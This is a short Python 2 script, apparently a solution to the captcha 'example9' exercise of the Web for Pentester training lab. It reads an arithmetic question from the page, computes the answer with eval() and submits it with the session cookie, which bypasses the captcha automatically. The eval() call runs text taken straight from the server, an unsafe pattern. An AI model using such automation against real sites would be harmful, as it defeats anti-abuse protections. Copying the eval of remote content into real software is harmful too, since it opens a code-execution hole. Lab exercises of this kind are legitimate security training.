import hashlib, httplib, urllib, re
from lxml.html import fromstring
 
con = httplib.HTTPConnection('WEB FOR PENTESTER IP ADRESİ BURAYA')
con.request('GET', '/captcha/example9')
response = con.getresponse()
 
racksession = response.getheader('Set-Cookie')
html = fromstring(response.read())
islem = html.findtext('.//form')
islem = (islem[:-2]).strip()
sonuc = eval(islem)

headers = {'Cookie': racksession}
con.request('GET', '/captcha/example9/submit?captcha=%d&submit=Submit' % sonuc, '', headers)
response = con.getresponse()
print(fromstring(response.read()).xpath('//div[@class="text-success"]//b/text()'))

